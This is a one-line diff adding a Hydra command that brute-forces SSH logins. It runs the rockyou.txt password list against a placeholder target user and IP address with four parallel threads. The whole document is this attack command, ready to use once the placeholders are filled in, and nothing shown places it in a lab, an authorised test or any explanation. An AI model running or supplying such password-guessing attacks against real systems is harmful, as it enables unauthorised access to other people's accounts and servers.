@@ -1,0 +1,1 @@
+hydra -l "target_user" -P /usr/share/wordlists/rockyou.txt -t 4 ssh:"target_ip_address"
